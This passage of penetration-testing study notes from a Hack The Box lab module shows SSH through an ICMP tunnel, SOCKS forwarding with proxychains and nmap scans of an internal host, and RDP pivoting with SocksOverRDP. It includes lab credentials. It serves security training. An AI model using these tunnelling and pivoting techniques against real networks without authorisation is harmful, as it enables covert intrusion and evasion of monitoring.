With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (`-p2222`).

```
dollarboysushil@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
```

We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.

### **Enabling Dynamic Port Forwarding over SSH**

```
dollarboysushil@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1

ubuntu@127.0.0.1's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
<snip>
```

We could use proxychains with Nmap to scan targets on the internal network (172.16.5.x). Based on our discoveries, we can attempt to connect to the target.

```
dollarboysushil@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 11:10 EDT
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
Nmap scan report for 172.16.5.19
Host is up (0.12s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
```

# **Network Traffic Analysis Considerations**

![analyzingTheTraffic.gif](analyzingTheTraffic.gif)

In the first part of this clip, a connection is established over SSH without using ICMP tunneling. We may notice that `TCP` & `SSHv2` traffic is captured.

The command used in the clip: `ssh ubuntu@10.129.202.64`

In the second part of this clip, a connection is established over SSH using ICMP tunneling. Notice the type of traffic that is captured when this is performed.

Command used in clip: `ssh -p2222 -lubuntu 127.0.0.1`

# **Double Pivots**

## **RDP and SOCKS Tunneling with SocksOverRDP**

Some times we may be limited to windows network and not able to use SSH for pivoting. In this case we have to use tools available on windows os.

[SocksOverRDP](https://github.com/nccgroup/SocksOverRDP) is an example of a tool that uses `Dynamic Virtual Channels` (`DVC`) from the Remote Desktop Service feature of Windows
We will use proxifier as out proxy server.

Tools needed

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Transfer this to pivot windows.

### **Loading SocksOverRDP.dll using regsvr32.exe**

```bash
C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Now we can connect to 172.16.5.19 over RDP using `mstsc.exe`, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080. We can use the credentials `victor:pass@123` to connect to 172.16.5.19.

We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to 172.16.5.19. We can then start SocksOverRDP-Server.exe with Admin privileges.

# `/// [https://academy.hackthebox.com/module/158/section/1439](https://academy.hackthebox.com/module/158/section/1439)`
